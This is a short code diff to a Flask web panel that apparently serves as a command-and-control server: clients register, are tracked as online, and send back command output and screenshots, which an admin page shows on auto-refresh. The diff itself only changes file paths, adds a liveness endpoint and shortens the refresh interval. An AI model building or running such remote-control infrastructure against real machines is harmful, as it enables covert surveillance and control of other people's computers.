@@ -5,9 +5,9 @@ from flask import Flask, request, g, Response, redirect, render_template_string,
 API_TOKEN  = os.environ.get("PANEL_TOKEN", "change-me")
 ADMIN_USER = os.environ.get("PANEL_USER", "admin")
 ADMIN_PASS = os.environ.get("PANEL_PASS", "change-me")
-DB_PATH    = os.environ.get("PANEL_DB", "panel.db")
+DB_PATH    = os.environ.get("PANEL_DB", "/tmp/panel.db")
+UPLOAD_DIR = "/tmp/uploads"
 ONLINE_SEC = 90
-UPLOAD_DIR = "uploads"
 
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 app = Flask(__name__)
@@ -49,6 +49,10 @@ def admin_ok():
     u = request.authorization
     return (u and secrets.compare_digest(u.username, ADMIN_USER)
             and secrets.compare_digest(u.password, ADMIN_PASS))
+
+@app.get("/api/alive")
+def alive():
+    return "ok", 200
 
 @app.post("/api/register")
 def register():
@@ -152,7 +156,7 @@ button:hover{background:#363}
 {% else %}{% if c.result.startswith('[+] Screenshot: ') %}
 <img src="{{ c.result.replace('[+] Screenshot: ', '') }}" style="max-width:100%; border:1px solid #333;">
 {% else %}{{ c.result }}{% endif %}{% endif %}</pre>{% endfor %}
-<meta http-equiv=refresh content=5>"""
+<meta http-equiv=refresh content=3>"""
 
 def ago(ts):
     d = int(time.time()) - ts
